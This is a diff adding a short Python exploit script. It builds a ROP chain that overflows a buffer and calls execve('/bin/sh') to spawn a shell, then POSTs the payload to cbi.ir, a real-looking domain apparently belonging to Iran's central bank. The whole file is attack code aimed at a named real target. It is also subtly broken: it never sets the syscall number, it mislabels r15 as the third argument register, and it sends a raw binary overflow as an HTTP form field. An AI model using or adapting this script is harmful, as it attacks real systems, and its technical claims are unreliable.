@@ -1,0 +1,28 @@
+import struct
+
+# Example gadgets found from the binary
+pop_rdi = 0x40100d  # Address of the gadget `pop rdi; ret`
+pop_rsi_r15 = 0x40100f  # Address of the gadget `pop rsi; pop r15; ret`
+syscall = 0x400fe5  # Address of the syscall gadget
+bin_sh = 0x600010  # Address of the string "/bin/sh" in the binary
+
+# Build a ROP chain that spawns a shell
+rop_chain = [
+    pop_rdi,     # Gadget to set the first argument (rdi)
+    bin_sh,      # Address of "/bin/sh"
+    pop_rsi_r15, # Gadget to set second and third arguments (rsi and r15)
+    0x0,         # Null pointer (for the second argument)
+    0x0,         # Null pointer (for the third argument, r15)
+    syscall      # Trigger the syscall for execve("/bin/sh", NULL, NULL)
+]
+
+# Pack the ROP chain to send it over the network
+payload = b"A" * 512  # Overflow buffer (adjust size as needed)
+payload += b"".join([struct.pack("<Q", gadget) for gadget in rop_chain])
+
+# Send the payload via HTTP to the vulnerable server
+import requests
+
+url = "https://cbi.ir"
+response = requests.post(url, data={"exploit": payload})
+print(response.text)
